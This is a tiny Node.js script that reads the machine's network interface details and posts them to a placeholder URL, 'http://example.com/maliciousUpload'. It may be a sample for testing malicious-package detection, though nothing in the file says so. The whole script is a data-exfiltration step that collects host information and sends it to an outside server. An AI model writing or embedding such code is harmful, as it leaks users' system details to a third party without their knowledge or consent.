const os = require('os')

const interfaces = os.networkInterfaces()
console.log('Interfaces:', interfaces)

// upload
fetch(
  'http://example.com/maliciousUpload',
  {
    method: 'post',
    body: { interfaces }
  }
)
